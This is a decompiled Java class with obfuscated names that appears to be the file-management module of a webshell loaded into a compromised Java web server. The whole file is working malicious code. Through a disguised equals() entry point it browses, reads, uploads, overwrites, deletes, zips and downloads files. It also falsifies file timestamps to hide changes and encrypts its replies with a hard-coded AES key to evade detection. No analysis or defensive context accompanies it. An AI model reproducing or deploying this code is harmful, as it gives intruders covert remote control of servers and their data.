/*
 * Decompiled with CFR 0.152.
 */
package com.rqad;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.charset.Charset;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Oaqay {
    public static String mode;
    public static String path;
    public static String newPath;
    public static String content;
    public static String charset;
    public static String hash;
    public static String blockIndex;
    public static String blockSize;
    public static String createTimeStamp;
    public static String modifyTimeStamp;
    public static String accessTimeStamp;
    private Object Request;
    private Object Response;
    private Object Session;
    private Charset osCharset;

    public Oaqay() {
        mode = "";
        mode = mode + "list";
        path = "";
        path = path + "/IBM/";
        this.osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Loose catch block
     */
    public boolean equals(Object obj) {
        block29: {
            Map<Object, Object> result;
            block27: {
                block28: {
                    result = new HashMap<String, String>();
                    this.fillContext(obj);
                    if (mode.equalsIgnoreCase("list")) {
                        result.put("msg", this.list());
                        result.put("status", "success");
                        break block27;
                    }
                    if (mode.equalsIgnoreCase("show")) {
                        result.put("msg", this.show());
                        result.put("status", "success");
                        break block27;
                    }
                    if (mode.equalsIgnoreCase("checkExist")) {
                        result.put("msg", this.checkExist(path));
                        result.put("status", "success");
                        break block27;
                    }
                    if (mode.equalsIgnoreCase("delete")) {
                        result = this.delete();
                        break block27;
                    }
                    if (mode.equalsIgnoreCase("create")) {
                        result.put("msg", this.create());
                        result.put("status", "success");
                        break block27;
                    }
                    if (mode.equalsIgnoreCase("append")) {
                        result.put("msg", this.append());
                        result.put("status", "success");
                        break block27;
                    }
                    if (mode.equalsIgnoreCase("update")) {
                        this.updateFile();
                        result.put("msg", "ok");
                        result.put("status", "success");
                        break block27;
                    }
                    if (mode.equalsIgnoreCase("downloadPart")) {
                        result.put("msg", this.downloadPart(path, Long.parseLong(blockIndex), Long.parseLong(blockSize)));
                        result.put("status", "success");
                        break block27;
                    }
                    if (!mode.equalsIgnoreCase("download")) break block28;
                    this.download();
                    boolean bl = true;
                    try {
                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        Method write = so.getClass().getMethod("write", byte[].class);
                        write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                    }
                    catch (Exception so) {
                        // empty catch block
                    }
                    return bl;
                }
                if (mode.equalsIgnoreCase("rename")) {
                    result = this.renameFile();
                    break block27;
                }
                if (mode.equalsIgnoreCase("createFile")) {
                    result.put("msg", this.createFile());
                    result.put("status", "success");
                    break block27;
                }
                if (mode.equalsIgnoreCase("compress")) {
                    Oaqay.zipFile(path, true);
                    result.put("msg", "ok");
                    result.put("status", "success");
                    break block27;
                }
                if (mode.equalsIgnoreCase("createDirectory")) {
                    result.put("msg", this.createDirectory());
                    result.put("status", "success");
                    break block27;
                }
                if (mode.equalsIgnoreCase("getTimeStamp")) {
                    result.put("msg", this.getTimeStamp());
                    result.put("status", "success");
                    break block27;
                }
                if (mode.equalsIgnoreCase("updateTimeStamp")) {
                    result.put("msg", this.updateTimeStamp());
                    result.put("status", "success");
                    break block27;
                }
                if (!mode.equalsIgnoreCase("check")) break block27;
                result.put("msg", this.checkFileHash(path));
                result.put("status", "success");
            }
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            }
            catch (Exception so) {}
            break block29;
            catch (Exception e) {
                try {
                    result.put("msg", e.getMessage());
                    result.put("status", "fail");
                }
                catch (Throwable throwable) {
                    try {
                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        Method write = so.getClass().getMethod("write", byte[].class);
                        write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    throw throwable;
                }
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write = so.getClass().getMethod("write", byte[].class);
                    write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                }
                catch (Exception exception) {}
            }
        }
        return true;
    }

    private String checkFileHash(String path) throws Exception {
        byte[] input;
        FileChannel ch = (FileChannel)this.sessionGetAttribute(this.Session, path);
        if (ch != null && ch.isOpen()) {
            ch.close();
        }
        if ((input = this.getFileData(path)) == null || input.length == 0) {
            return null;
        }
        MessageDigest md5 = MessageDigest.getInstance("MD5");
        md5.update(input);
        byte[] byteArray = md5.digest();
        StringBuilder sb = new StringBuilder();
        for (byte b : byteArray) {
            sb.append(String.format("%02x", b));
        }
        return sb.substring(0, 16);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private void updateFile() throws Exception {
        FileChannel ch = (FileChannel)this.sessionGetAttribute(this.Session, path);
        if (ch == null) {
            FileOutputStream fos = new FileOutputStream(path);
            ch = fos.getChannel();
            this.sessionSetAttribute(this.Session, "fos", fos);
            this.sessionSetAttribute(this.Session, path, ch);
        }
        FileChannel fileChannel = ch;
        synchronized (fileChannel) {
            ch.position(Integer.parseInt(blockIndex) * Integer.parseInt(blockSize));
            ch.write(ByteBuffer.wrap(this.base64decode(content)));
        }
    }

    private Map<String, String> warpFileObj(File file) {
        HashMap<String, String> obj = new HashMap<String, String>();
        obj.put("type", file.isDirectory() ? "directory" : "file");
        obj.put("name", file.getName());
        obj.put("size", file.length() + "");
        obj.put("perm", this.getFilePerm(file));
        obj.put("lastModified", new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(file.lastModified())));
        return obj;
    }

    private boolean isOldJava() {
        String version = System.getProperty("java.version");
        return version.compareTo("1.7") < 0;
    }

    private String checkExist(String path) throws Exception {
        File file = new File(path);
        if (file.exists()) {
            return file.length() + "";
        }
        throw new Exception("");
    }

    private String getFilePerm(File file) {
        String permStr = "";
        if (this.isWindows()) {
            permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
        } else {
            String version = System.getProperty("java.version");
            if (version.compareTo("1.7") >= 0) {
                try {
                    this.getClass();
                    Class<?> FilesCls = Class.forName("java.nio.file.Files");
                    this.getClass();
                    Class<?> PosixFileAttributesCls = Class.forName("java.nio.file.attribute.PosixFileAttributes");
                    this.getClass();
                    Class<?> PathsCls = Class.forName("java.nio.file.Paths");
                    this.getClass();
                    Class<?> PosixFilePermissionsCls = Class.forName("java.nio.file.attribute.PosixFilePermissions");
                    Object f = PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), file.getAbsolutePath(), new String[0]);
                    Object attrs = FilesCls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(FilesCls, f, PosixFileAttributesCls, new LinkOption[0]);
                    Object result = PosixFilePermissionsCls.getMethod("toString", Set.class).invoke(PosixFilePermissionsCls, PosixFileAttributesCls.getMethod("permissions", new Class[0]).invoke(attrs, new Object[0]));
                    permStr = result.toString();
                }
                catch (Exception exception) {}
            } else {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
            }
        }
        return permStr;
    }

    private String list() throws Exception {
        String result = "";
        File f = new File(path);
        ArrayList<Map<String, String>> objArr = new ArrayList<Map<String, String>>();
        objArr.add(this.warpFileObj(new File(".")));
        objArr.add(this.warpFileObj(new File("..")));
        if (f.isDirectory() && f.listFiles() != null) {
            for (File temp : f.listFiles()) {
                objArr.add(this.warpFileObj(temp));
            }
        }
        result = this.buildJsonArray(objArr, true);
        return result;
    }

    private String show() throws Exception {
        byte[] fileContent = this.getFileData(path);
        return Oaqay.base64encode(fileContent);
    }

    private byte[] getFileData(String path) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(new File(path));
        byte[] buffer = new byte[10240000];
        int length = 0;
        while ((length = fis.read(buffer)) > 0) {
            output.write(Arrays.copyOfRange(buffer, 0, length));
        }
        fis.close();
        return output.toByteArray();
    }

    private String create() throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path);
        fso.write(this.base64decode(content));
        fso.flush();
        fso.close();
        result = path + "\u4e0a\u4f20\u5b8c\u6210\uff0c\u8fdc\u7a0b\u6587\u4ef6\u5927\u5c0f:" + new File(path).length();
        return result;
    }

    private Map<String, String> renameFile() throws Exception {
        HashMap<String, String> result = new HashMap<String, String>();
        File oldFile = new File(path);
        File newFile = new File(newPath);
        if (oldFile.exists() && oldFile.isFile() & oldFile.renameTo(newFile)) {
            result.put("status", "success");
            result.put("msg", "\u91cd\u547d\u540d\u5b8c\u6210:" + newPath);
        } else {
            result.put("status", "fail");
            result.put("msg", "\u91cd\u547d\u540d\u5931\u8d25:" + newPath);
        }
        return result;
    }

    private String createFile() throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path);
        fso.close();
        result = path + "\u521b\u5efa\u5b8c\u6210";
        return result;
    }

    private String createDirectory() throws Exception {
        String result = "";
        File dir = new File(path);
        dir.mkdirs();
        result = path + "\u521b\u5efa\u5b8c\u6210";
        return result;
    }

    private void download() throws Exception {
        FileInputStream fis = new FileInputStream(path);
        byte[] buffer = new byte[1024000];
        int length = 0;
        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
        Method write = so.getClass().getMethod("write", byte[].class);
        while ((length = fis.read(buffer)) > 0) {
            write.invoke(so, new Object[]{Arrays.copyOfRange(buffer, 0, length)});
        }
        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
        fis.close();
    }

    private String append() throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path, true);
        fso.write(this.base64decode(content));
        fso.flush();
        fso.close();
        result = path + "\u8ffd\u52a0\u5b8c\u6210\uff0c\u8fdc\u7a0b\u6587\u4ef6\u5927\u5c0f:" + new File(path).length();
        return result;
    }

    private Map<String, String> delete() throws Exception {
        HashMap<String, String> result = new HashMap<String, String>();
        File f = new File(path);
        if (f.exists()) {
            if (f.delete()) {
                result.put("status", "success");
                result.put("msg", path + " \u5220\u9664\u6210\u529f.");
            } else {
                result.put("status", "fail");
                result.put("msg", "\u6587\u4ef6" + path + "\u5b58\u5728\uff0c\u4f46\u662f\u5220\u9664\u5931\u8d25.");
            }
        } else {
            result.put("status", "fail");
            result.put("msg", "\u6587\u4ef6\u4e0d\u5b58\u5728.");
        }
        return result;
    }

    private String getTimeStamp() throws Exception {
        String result = "";
        SimpleDateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        HashMap<String, String> timeStampObj = new HashMap<String, String>();
        if (!f.exists()) {
            throw new Exception("\u6587\u4ef6\u4e0d\u5b58\u5728");
        }
        this.getClass();
        Class<?> FilesCls = Class.forName("java.nio.file.Files");
        this.getClass();
        Class<?> BasicFileAttributesCls = Class.forName("java.nio.file.attribute.BasicFileAttributes");
        this.getClass();
        Class<?> PathsCls = Class.forName("java.nio.file.Paths");
        Object file = PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), path, new String[0]);
        Object attrs = FilesCls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(FilesCls, file, BasicFileAttributesCls, new LinkOption[0]);
        Class<?> FileTimeCls = Class.forName("java.nio.file.attribute.FileTime");
        Object createTime = FileTimeCls.getMethod("toMillis", new Class[0]).invoke(BasicFileAttributesCls.getMethod("creationTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
        Object lastAccessTime = FileTimeCls.getMethod("toMillis", new Class[0]).invoke(BasicFileAttributesCls.getMethod("lastAccessTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
        Object lastModifiedTime = FileTimeCls.getMethod("toMillis", new Class[0]).invoke(BasicFileAttributesCls.getMethod("lastModifiedTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
        String createTimeStamp = df.format(new Date((Long)createTime));
        String lastAccessTimeStamp = df.format(new Date((Long)lastAccessTime));
        String lastModifiedTimeStamp = df.format(new Date((Long)lastModifiedTime));
        timeStampObj.put("createTime", createTimeStamp);
        timeStampObj.put("lastAccessTime", lastAccessTimeStamp);
        timeStampObj.put("lastModifiedTime", lastModifiedTimeStamp);
        result = this.buildJson(timeStampObj, true);
        return result;
    }

    private boolean isWindows() {
        return System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0;
    }

    private String updateTimeStamp() throws Exception {
        String result = "";
        SimpleDateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        if (f.exists()) {
            f.setLastModified(df.parse(modifyTimeStamp).getTime());
            if (!this.isOldJava()) {
                Class<?> PathsCls = Class.forName("java.nio.file.Paths");
                Class<?> BasicFileAttributeViewCls = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                Class<?> FileTimeCls = Class.forName("java.nio.file.attribute.FileTime");
                Method getFileAttributeView = Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", Path.class, Class.class, LinkOption[].class);
                Object attributes = getFileAttributeView.invoke(Class.forName("java.nio.file.Files"), PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), path, new String[0]), BasicFileAttributeViewCls, new LinkOption[0]);
                Object createTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, df.parse(createTimeStamp).getTime());
                Object accessTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, df.parse(accessTimeStamp).getTime());
                Object modifyTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, df.parse(modifyTimeStamp).getTime());
                BasicFileAttributeViewCls.getMethod("setTimes", FileTimeCls, FileTimeCls, FileTimeCls).invoke(attributes, modifyTime, accessTime, createTime);
            }
        } else {
            throw new Exception("\u6587\u4ef6\u4e0d\u5b58\u5728");
        }
        result = "\u65f6\u95f4\u6233\u4fee\u6539\u6210\u529f\u3002";
        return result;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private String downloadPart(String path, long blockIndex, long blockSize) throws Exception {
        int size;
        FileChannel ch = (FileChannel)this.sessionGetAttribute(this.Session, path);
        if (ch == null) {
            FileInputStream fis = new FileInputStream(path);
            ch = fis.getChannel();
            this.sessionSetAttribute(this.Session, "fis", fis);
            this.sessionSetAttribute(this.Session, path, ch);
        }
        ByteBuffer buffer = ByteBuffer.allocate((int)blockSize);
        FileChannel fileChannel = ch;
        synchronized (fileChannel) {
            ch.position(blockIndex * blockSize);
            size = ch.read(buffer);
        }
        byte[] content = buffer.array();
        return Oaqay.base64encode(Arrays.copyOfRange(content, 0, size));
    }

    private static void zipFile(String srcDir, boolean KeepDirStructure) throws Exception {
        File file = new File(srcDir);
        String fileName = file.getName();
        FileOutputStream out = new FileOutputStream(new File(srcDir).getParentFile().getAbsolutePath() + File.separator + fileName + ".zip");
        long start = System.currentTimeMillis();
        ZipOutputStream zos = null;
        try {
            zos = new ZipOutputStream(out);
            File sourceFile = new File(srcDir);
            Oaqay.compress(sourceFile, zos, sourceFile.getName(), KeepDirStructure);
            long l = System.currentTimeMillis();
        }
        catch (Exception e) {
            throw new RuntimeException("zip error from ZipUtils", e);
        }
        finally {
            if (zos != null) {
                try {
                    zos.close();
                }
                catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private static void compress(File sourceFile, ZipOutputStream zos, String name, boolean KeepDirStructure) throws Exception {
        byte[] buf = new byte[102400];
        if (sourceFile.isFile()) {
            int len;
            zos.putNextEntry(new ZipEntry(name));
            FileInputStream in = new FileInputStream(sourceFile);
            while ((len = in.read(buf)) != -1) {
                zos.write(buf, 0, len);
            }
            zos.closeEntry();
            in.close();
        } else {
            File[] listFiles = sourceFile.listFiles();
            if (listFiles == null || listFiles.length == 0) {
                if (KeepDirStructure) {
                    zos.putNextEntry(new ZipEntry(name + "/"));
                    zos.closeEntry();
                }
            } else {
                for (File file : listFiles) {
                    if (KeepDirStructure) {
                        Oaqay.compress(file, zos, name + "/" + file.getName(), KeepDirStructure);
                        continue;
                    }
                    Oaqay.compress(file, zos, file.getName(), KeepDirStructure);
                }
            }
        }
    }

    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (Map<String, String> entity : list) {
            sb.append(this.buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                Object Encoder;
                Class<?> Base64;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] base64decode(String base64Text) throws Exception {
        byte[] result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
            result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        } else {
            this.getClass();
            Class<?> Base64 = Class.forName("sun.misc.BASE64Decoder");
            Object Decoder = Base64.newInstance();
            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
        }
        return result;
    }

    private static String base64encode(String content) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{content.getBytes("UTF-8")});
        } else {
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{content.getBytes("UTF-8")});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private static String base64encode(byte[] content) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{content});
        } else {
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{content});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    private Object sessionGetAttribute(Object session, String key) {
        Object result = null;
        try {
            result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return result;
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "bc2172db605712b9";
        byte[] byArray2 = string.getBytes("utf-8");
        SecretKeySpec secretKeySpec = new SecretKeySpec(byArray2, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] byArray3 = cipher.doFinal(byArray);
        try {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object object = clazz.getMethod("getEncoder", null).invoke(clazz, null);
            byArray3 = (byte[])object.getClass().getMethod("encode", byte[].class).invoke(object, new Object[]{byArray3});
        }
        catch (Throwable throwable) {
            Class<?> clazz = Class.forName("sun.misc.BASE64Encoder");
            Object obj = clazz.newInstance();
            String string2 = (String)obj.getClass().getMethod("encode", byte[].class).invoke(obj, new Object[]{byArray3});
            string2 = string2.replace("\n", "").replace("\r", "");
            byArray3 = string2.getBytes();
        }
        return byArray3;
    }
}
